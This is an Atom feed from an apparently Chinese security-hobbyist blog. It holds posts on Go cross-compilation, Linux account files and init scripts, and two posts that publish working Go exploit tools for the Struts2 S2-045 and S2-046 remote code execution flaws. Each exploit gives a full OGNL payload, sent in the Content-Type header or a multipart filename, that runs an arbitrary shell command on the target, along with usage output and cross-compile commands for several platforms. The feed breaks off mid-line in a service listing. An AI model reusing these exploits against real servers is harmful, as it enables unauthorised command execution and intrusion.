<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0x001 Team</title>
  <subtitle>网络安全爱好者</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.0x001.com/"/>
  <updated>2017-06-06T17:53:03.000Z</updated>
  <id>http://www.0x001.com/</id>
  
  <author>
    <name>1</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>golang编译</title>
    <link href="http://www.0x001.com/2017/03/21/golang%E7%BC%96%E8%AF%91/"/>
    <id>http://www.0x001.com/2017/03/21/golang编译/</id>
    <published>2017-03-21T08:46:50.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、交叉编译"><a href="#一、交叉编译" class="headerlink" title="一、交叉编译"></a>一、交叉编译</h1><p>只需设置 GOOS 和 GOARCH 两个环境变量就能生成所需平台的Go程序</p>
<blockquote>
<p>比如生成mac osx上可以执行的程序</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[mac]# GOOS=darwin GOARCH=amd64 go build test.go</div></pre></td></tr></table></figure>
<p>所有可以交叉编译的OS和ARCH的值如下：</p>
<table>
<thead>
<tr>
<th>$GOOS</th>
<th>$GOARCH</th>
</tr>
</thead>
<tbody>
<tr>
<td>darwin</td>
<td>386</td>
</tr>
<tr>
<td>darwin</td>
<td>amd64</td>
</tr>
<tr>
<td>darwin</td>
<td>arm</td>
</tr>
<tr>
<td>darwin</td>
<td>arm64</td>
</tr>
<tr>
<td>dragonfly</td>
<td>amd64</td>
</tr>
<tr>
<td>freebsd</td>
<td>386</td>
</tr>
<tr>
<td>freebsd</td>
<td>amd64</td>
</tr>
<tr>
<td>freebsd</td>
<td>arm</td>
</tr>
<tr>
<td>linux</td>
<td>386</td>
</tr>
<tr>
<td>linux</td>
<td>amd64</td>
</tr>
<tr>
<td>linux</td>
<td>arm</td>
</tr>
<tr>
<td>linux</td>
<td>arm64</td>
</tr>
<tr>
<td>linux</td>
<td>ppc64</td>
</tr>
<tr>
<td>linux</td>
<td>ppc64le</td>
</tr>
<tr>
<td>netbsd</td>
<td>386</td>
</tr>
<tr>
<td>netbsd</td>
<td>amd64</td>
</tr>
<tr>
<td>netbsd</td>
<td>arm</td>
</tr>
<tr>
<td>openbsd</td>
<td>386</td>
</tr>
<tr>
<td>openbsd</td>
<td>amd64</td>
</tr>
<tr>
<td>openbsd</td>
<td>arm</td>
</tr>
<tr>
<td>plan9</td>
<td>386</td>
</tr>
<tr>
<td>plan9</td>
<td>amd64</td>
</tr>
<tr>
<td>solaris</td>
<td>amd64</td>
</tr>
<tr>
<td>windows</td>
<td>386</td>
</tr>
<tr>
<td>windows</td>
<td>amd64</td>
</tr>
</tbody>
</table>
<h1 id="二、编译文件最小化"><a href="#二、编译文件最小化" class="headerlink" title="二、编译文件最小化"></a>二、编译文件最小化</h1><ol>
<li><p>编译go文件，去掉符号信息和调试信息<br> -a 强制编译所有依赖包。<br> -s 去掉符号信息<br> -w 去掉DWARF调试信息，得到的程序就不能用gdb调试了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[mac]# go build -ldflags &quot;-s -w&quot; hello.go</div></pre></td></tr></table></figure>
</li>
<li><p>upx压缩文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[mac]# upx -9 -k hello</div></pre></td></tr></table></figure></li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、交叉编译&quot;&gt;&lt;a href=&quot;#一、交叉编译&quot; class=&quot;headerlink&quot; title=&quot;一、交叉编译&quot;&gt;&lt;/a&gt;一、交叉编译&lt;/h1&gt;&lt;p&gt;只需设置 GOOS 和 GOARCH 两个环境变量就能生成所需平台的Go程序&lt;/p&gt;
&lt;blockquote
    
    </summary>
    
      <category term="golang" scheme="http://www.0x001.com/categories/golang/"/>
    
    
      <category term="golang" scheme="http://www.0x001.com/tags/golang/"/>
    
  </entry>
  
  <entry>
    <title>s2-046</title>
    <link href="http://www.0x001.com/2017/03/21/s2-046-exp/"/>
    <id>http://www.0x001.com/2017/03/21/s2-046-exp/</id>
    <published>2017-03-21T08:41:58.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Struts2-远程执行漏洞利用程序"><a href="#Struts2-远程执行漏洞利用程序" class="headerlink" title="Struts2 远程执行漏洞利用程序"></a>Struts2 远程执行漏洞利用程序</h1><p>使用golang实现的一个小工具<br>使用方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">system@mac:~/golang/src/s2-046$ ./main http://xxx.com/1.jsp ifconfig</div><div class="line">200</div><div class="line">map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]</div><div class="line"></div><div class="line">eth0      Link encap:Ethernet  HWaddr 52:54:E4:D1:15:00</div><div class="line">          inet addr:192.168.1.8  Bcast:192.168.1.255  Mask:255.255.255.0</div><div class="line">          inet6 addr: fe80::5054:e4ff:fed1:1500/64 Scope:Link</div><div class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:9999952 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:6667457 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:6575210434 (6.1 GiB)  TX bytes:939669875 (896.1 MiB)</div></pre></td></tr></table></figure></p>
<p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">package main</div><div class="line"></div><div class="line">import (</div><div class="line">	&quot;bytes&quot;</div><div class="line">	&quot;flag&quot;</div><div class="line">	&quot;fmt&quot;</div><div class="line">	&quot;log&quot;</div><div class="line">	&quot;mime/multipart&quot;</div><div class="line">	&quot;net/http&quot;</div><div class="line">)</div><div class="line"></div><div class="line">/* 给body添加类似上传文件的mime/multipart内容 */</div><div class="line">func newMultipartRequest(url string, params map[string]string, cmd string) (*http.Request, error) &#123;</div><div class="line"></div><div class="line">	payload := &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm)&quot; +</div><div class="line">		&quot;:((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensym&quot; +</div><div class="line">		&quot;phony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())&quot; +</div><div class="line">		&quot;.(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot; + cmd + &quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().c&quot; +</div><div class="line">		&quot;ontains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).&quot; +</div><div class="line">		&quot;(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOut&quot; +</div><div class="line">		&quot;putStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\x00b&quot;</div><div class="line"></div><div class="line">	body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">	writer := multipart.NewWriter(body)</div><div class="line"></div><div class="line">	_, err := writer.CreateFormFile(&quot;foo&quot;, payload)</div><div class="line">	if err != nil &#123;</div><div class="line">		return nil, err</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	for key, val := range params &#123;</div><div class="line">		_ = writer.WriteField(key, val)</div><div class="line">	&#125;</div><div class="line">	writer.Close()</div><div class="line"></div><div class="line">	req, err := http.NewRequest(&quot;POST&quot;, url, body)</div><div class="line">	req.Header.Set(&quot;Content-Type&quot;, writer.FormDataContentType())</div><div class="line">	return req, err</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">func main() &#123;</div><div class="line">	flag.Parse()</div><div class="line">	url := flag.Arg(0)</div><div class="line">	cmd := flag.Arg(1)</div><div class="line"></div><div class="line">	extraParams := map[string]string&#123;</div><div class="line">		&quot;&quot;: &quot;&quot;,</div><div class="line">	&#125;</div><div class="line">	request, err := newMultipartRequest(url, extraParams, cmd)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125;</div><div class="line">	request.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;)</div><div class="line"></div><div class="line">	client := &amp;http.Client&#123;&#125;</div><div class="line">	resp, err := client.Do(request)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125; else &#123;</div><div class="line">		/* 读取response返回数据 */</div><div class="line">		body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">		_, err := body.ReadFrom(resp.Body)</div><div class="line">		if err != nil &#123;</div><div class="line">			log.Fatal(err)</div><div class="line">		&#125;</div><div class="line">		resp.Body.Close()</div><div class="line">		//fmt.Println(resp.StatusCode)</div><div class="line">		//fmt.Println(resp.Header)</div><div class="line">		fmt.Println(body)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>交叉编译Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=linux GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
<p>交叉编译Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=windows GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
<p>交叉编译Mac OSX<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=darwin GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Struts2-远程执行漏洞利用程序&quot;&gt;&lt;a href=&quot;#Struts2-远程执行漏洞利用程序&quot; class=&quot;headerlink&quot; title=&quot;Struts2 远程执行漏洞利用程序&quot;&gt;&lt;/a&gt;Struts2 远程执行漏洞利用程序&lt;/h1&gt;&lt;p&gt;使用gola
    
    </summary>
    
      <category term="Exploit" scheme="http://www.0x001.com/categories/Exploit/"/>
    
    
      <category term="golang" scheme="http://www.0x001.com/tags/golang/"/>
    
      <category term="struts2" scheme="http://www.0x001.com/tags/struts2/"/>
    
      <category term="exp" scheme="http://www.0x001.com/tags/exp/"/>
    
      <category term="RCE" scheme="http://www.0x001.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>s2-045-exp</title>
    <link href="http://www.0x001.com/2017/03/21/s2-045-exp/"/>
    <id>http://www.0x001.com/2017/03/21/s2-045-exp/</id>
    <published>2017-03-21T05:06:16.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Struts2-远程执行漏洞利用程序"><a href="#Struts2-远程执行漏洞利用程序" class="headerlink" title="Struts2 远程执行漏洞利用程序"></a>Struts2 远程执行漏洞利用程序</h1><p>使用golang实现的一个小工具<br>使用方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">system@mac:~/golang/src/s2-045$ ./main http://xxx.com/1.jsp ifconfig</div><div class="line">200</div><div class="line">map[Server:[Apache-Coyote/1.1] Date:[Tue, 21 Mar 2017 06:08:39 GMT]]</div><div class="line"></div><div class="line">eth0      Link encap:Ethernet  HWaddr 52:54:E4:D1:15:00</div><div class="line">          inet addr:192.168.1.8  Bcast:192.168.1.255  Mask:255.255.255.0</div><div class="line">          inet6 addr: fe80::5054:e4ff:fed1:1500/64 Scope:Link</div><div class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</div><div class="line">          RX packets:9999952 errors:0 dropped:0 overruns:0 frame:0</div><div class="line">          TX packets:6667457 errors:0 dropped:0 overruns:0 carrier:0</div><div class="line">          collisions:0 txqueuelen:1000</div><div class="line">          RX bytes:6575210434 (6.1 GiB)  TX bytes:939669875 (896.1 MiB)</div></pre></td></tr></table></figure></p>
<p>源代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div></pre></td><td class="code"><pre><div class="line">package main</div><div class="line"></div><div class="line">import (</div><div class="line">	&quot;bytes&quot;</div><div class="line">	&quot;flag&quot;</div><div class="line">	&quot;fmt&quot;</div><div class="line">	&quot;log&quot;</div><div class="line">	&quot;mime/multipart&quot;</div><div class="line">	&quot;net/http&quot;</div><div class="line">)</div><div class="line"></div><div class="line">/* 给body添加类似上传文件的mime/multipart内容 */</div><div class="line">func newMultipartRequest(url string, params map[string]string) (*http.Request, error) &#123;</div><div class="line">	body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">	writer := multipart.NewWriter(body)</div><div class="line">	for key, val := range params &#123;</div><div class="line">		_ = writer.WriteField(key, val)</div><div class="line">	&#125;</div><div class="line">	writer.Close()</div><div class="line">	return http.NewRequest(&quot;POST&quot;, url, body)</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">func main() &#123;</div><div class="line">	flag.Parse()</div><div class="line">	url := flag.Arg(0)</div><div class="line">	cmd := flag.Arg(1)</div><div class="line">	payload := &quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm)&quot; +</div><div class="line">		&quot;:((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensym&quot; +</div><div class="line">		&quot;phony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())&quot; +</div><div class="line">		&quot;.(#context.setMemberAccess(#dm)))).(#cmd=&apos;&quot; + cmd + &quot;&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().c&quot; +</div><div class="line">		&quot;ontains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).&quot; +</div><div class="line">		&quot;(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOut&quot; +</div><div class="line">		&quot;putStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</div><div class="line">	extraParams := map[string]string&#123;</div><div class="line">		&quot;Test&quot;: &quot;&quot;,</div><div class="line">	&#125;</div><div class="line">	request, err := newMultipartRequest(url, extraParams)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125;</div><div class="line">	request.Header.Set(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;)</div><div class="line">	request.Header.Set(&quot;Content-Type&quot;, payload)</div><div class="line"></div><div class="line">	client := &amp;http.Client&#123;&#125;</div><div class="line">	resp, err := client.Do(request)</div><div class="line">	if err != nil &#123;</div><div class="line">		log.Fatal(err)</div><div class="line">	&#125; else &#123;</div><div class="line">		/* 读取response返回数据 */</div><div class="line">		body := &amp;bytes.Buffer&#123;&#125;</div><div class="line">		_, err := body.ReadFrom(resp.Body)</div><div class="line">		if err != nil &#123;</div><div class="line">			log.Fatal(err)</div><div class="line">		&#125;</div><div class="line">		resp.Body.Close()</div><div class="line">		fmt.Println(resp.StatusCode)</div><div class="line">		fmt.Println(resp.Header)</div><div class="line">		fmt.Println(body)</div><div class="line">	&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>交叉编译Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=linux GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
<p>交叉编译Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=windows GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
<p>交叉编译Mac OSX<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ GOOS=darwin GOARCH=amd64 go build -ldflags &quot;-s -w&quot; main.go</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Struts2-远程执行漏洞利用程序&quot;&gt;&lt;a href=&quot;#Struts2-远程执行漏洞利用程序&quot; class=&quot;headerlink&quot; title=&quot;Struts2 远程执行漏洞利用程序&quot;&gt;&lt;/a&gt;Struts2 远程执行漏洞利用程序&lt;/h1&gt;&lt;p&gt;使用gola
    
    </summary>
    
      <category term="Exploit" scheme="http://www.0x001.com/categories/Exploit/"/>
    
    
      <category term="golang" scheme="http://www.0x001.com/tags/golang/"/>
    
      <category term="struts2" scheme="http://www.0x001.com/tags/struts2/"/>
    
      <category term="exp" scheme="http://www.0x001.com/tags/exp/"/>
    
      <category term="RCE" scheme="http://www.0x001.com/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>Linux账户管理</title>
    <link href="http://www.0x001.com/2017/02/18/Linux%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86/"/>
    <id>http://www.0x001.com/2017/02/18/Linux账户管理/</id>
    <published>2017-02-18T02:05:21.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、Linux账户管理的基础"><a href="#一、Linux账户管理的基础" class="headerlink" title="一、Linux账户管理的基础"></a>一、Linux账户管理的基础</h1><blockquote>
<p>Linux下的所有账户数据都存储在文件中，涉及到的文件如下:</p>
</blockquote>
<table>
<thead>
<tr>
<th>文件名</th>
<th>作用描述　</th>
</tr>
</thead>
<tbody>
<tr>
<td>/etc/passwd</td>
<td>帐户文件</td>
</tr>
<tr>
<td>/etc/shadow</td>
<td>密码文件</td>
</tr>
<tr>
<td>/etc/group</td>
<td>用户组文件</td>
</tr>
<tr>
<td>/etc/gsshadow</td>
<td>用户组密码文件</td>
</tr>
<tr>
<td>/etc/sudoers</td>
<td>用户可执行指令控制文件</td>
</tr>
<tr>
<td>/etc/default/useradd</td>
<td>新增用户默认配置文件</td>
</tr>
<tr>
<td>/etc/login.defs</td>
<td>用户限制策略文件</td>
</tr>
</tbody>
</table>
<h1 id="二、-etc-passwd"><a href="#二、-etc-passwd" class="headerlink" title="二、 /etc/passwd"></a>二、 /etc/passwd</h1><blockquote>
<p>Linux的账户存储文件,我们通过几行配置来简单描述一下，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">root:x:0:0:root:/root:/bin/bash</div><div class="line">bin:x:1:1:bin:/bin:/sbin/nologin</div><div class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</div><div class="line">abc:x:500:500::/home/abc:/bin/bash</div></pre></td></tr></table></figure></p>
</blockquote>
<p>在文件中，每一个字段都以 “:” 分隔，分别定义了用户的各方面属性，各个字段的顺序和含义如下：</p>
<p>账户名称 : 口令 : 用户ID : 用户组ID : 用户描述 : 用户主目录 : 命令解释程序(shell)</p>
<p>重点讲一下口令和命令解释程序</p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一、Linux账户管理的基础&quot;&gt;&lt;a href=&quot;#一、Linux账户管理的基础&quot; class=&quot;headerlink&quot; title=&quot;一、Linux账户管理的基础&quot;&gt;&lt;/a&gt;一、Linux账户管理的基础&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;Linux下的所有
    
    </summary>
    
      <category term="Linux" scheme="http://www.0x001.com/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://www.0x001.com/tags/Linux/"/>
    
      <category term="账户管理" scheme="http://www.0x001.com/tags/%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86/"/>
    
      <category term="passwd" scheme="http://www.0x001.com/tags/passwd/"/>
    
      <category term="shadow" scheme="http://www.0x001.com/tags/shadow/"/>
    
      <category term="sudoer" scheme="http://www.0x001.com/tags/sudoer/"/>
    
  </entry>
  
  <entry>
    <title>Linux服务启动脚本</title>
    <link href="http://www.0x001.com/2017/02/08/Linux%E6%9C%8D%E5%8A%A1%E8%84%9A%E6%9C%AC/"/>
    <id>http://www.0x001.com/2017/02/08/Linux服务脚本/</id>
    <published>2017-02-08T09:36:33.000Z</published>
    <updated>2017-06-06T17:53:03.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、服务脚本的文件路径"><a href="#一、服务脚本的文件路径" class="headerlink" title="一、服务脚本的文件路径"></a>一、服务脚本的文件路径</h2><p>Linux(RH系列) 服务脚本默认都存放在 /etc/rc.d/init.d/目录下, 默认会做一个软链接到 /etc/init.d/</p>
<h2 id="二、服务脚本什么时候执行"><a href="#二、服务脚本什么时候执行" class="headerlink" title="二、服务脚本什么时候执行"></a>二、服务脚本什么时候执行</h2><p>Linux 服务脚本在以下启动顺序中执行如下：</p>
<ul>
<li>起始进程 /etc/init -&gt; </li>
<li>读取 /etc/inittab 配置文件 -&gt; </li>
<li>执行 /etc/rc.d/rc.sysinit 初始化系统脚本 -&gt; </li>
<li>执行 /etc/rc.d/rc 脚本确定运行级别的rcX.d目录 -&gt; </li>
<li>执行 /etc/rc.d/rcX.d/ 目录下S开头的软连接文件(X是inittab配置的数字) -&gt; </li>
<li><strong><em>执行 /etc/rc.d/init.d/ 下相应的服务脚本</em></strong></li>
</ul>
<p><em>系统初始化完内核、网络、主机名、交换分区、挂载磁盘等一系列动作后，就执行服务脚本</em></p>
<h2 id="三、最小化安装默认的服务"><a href="#三、最小化安装默认的服务" class="headerlink" title="三、最小化安装默认的服务"></a>三、最小化安装默认的服务</h2><h4 id="1-服务列表"><a href="#1-服务列表" class="headerlink" title="1. 服务列表"></a>1. 服务列表</h4><p>Linux(RH系列) Centos 6.5最小化安装后的服务列表和启动等级<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">[root@localhost init.d]<span class="comment"># ll</span></div><div class="line">总用量 128</div><div class="line">-rwxr-xr-x. 1 root root  3378 6月  22 2012 auditd</div><div class="line">-rwxr-xr-x. 1 root root  2793 7月  19 2011 crond</div><div class="line">-rw-r--r--. 1 root root 18216 1月   9 2013 <span class="built_in">functions</span></div><div class="line">-rwxr-xr-x. 1 root root  5829 1月   9 2013 halt</div><div class="line">-rwxr-xr-x. 1 root root  9515 2月  22 2013 ip6tables</div><div class="line">-rwxr-xr-x. 1 root root  9409 2月  22 2013 iptables</div><div class="line">-rwxr-xr-x. 1 root root   652 1月   9 2013 killall</div><div class="line">-rwxr-xr-x. 1 root root  2200 9月  14 2012 messagebus</div><div class="line">-rwxr-xr-x. 1 root root  2989 1月   9 2013 netconsole</div><div class="line">-rwxr-xr-x. 1 root root  5486 1月   9 2013 netfs</div><div class="line">-rwxr-xr-x. 1 root root  6334 1月   9 2013 network</div><div class="line">-rwxr-xr-x. 1 root root  3852 12月  3 2011 postfix</div><div class="line">-rwxr-xr-x. 1 root root  1559 5月  20 2009 rdisc</div><div class="line">-rwxr-xr-x. 1 root root  1822 2月  22 2013 restorecond</div><div class="line">-rwxr-xr-x. 1 root root  2011 1月  10 2013 rsyslog</div><div class="line">-rwxr-xr-x. 1 root root  1698 2月  22 2013 sandbox</div><div class="line">-rwxr-xr-x. 1 root root  2056 11月 20 2012 saslauthd</div><div class="line">-rwxr-xr-x. 1 root root   647 1月   9 2013 single</div><div class="line">-rwxr-xr-x. 1 root root  4534 2月  22 2013 sshd</div><div class="line">-rwxr-xr-x. 1 root root  2294 2月  22 2013 udev-post</div><div class="line">[root@localhost init.d]<span class="comment"># chkconfig --list</span></div><div class="line">auditd             0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">crond              0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">ip6tables          0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">iptables           0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">messagebus         0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">netconsole         0:关闭    1:关闭    2:关闭    3:关闭    4:关闭    5:关闭    6:关闭</div><div class="line">netfs              0:关闭    1:关闭    2:关闭    3:启用    4:启用    5:启用    6:关闭</div><div class="line">network            0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">postfix            0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">rdisc              0:关闭    1:关闭    2:关闭    3:关闭    4:关闭    5:关闭    6:关闭</div><div class="line">restorecond        0:关闭    1:关闭    2:关闭    3:关闭    4:关闭    5:关闭    6:关闭</div><div class="line">rsyslog            0:关闭    1:关闭    2:启用    3:启用    4:启用    5:启用    6:关闭</div><div class="line">saslauthd          0:关闭    1:关闭    2:关闭    3:关闭    4:关闭    5:关闭    6:关闭</div><div class="line">sshd               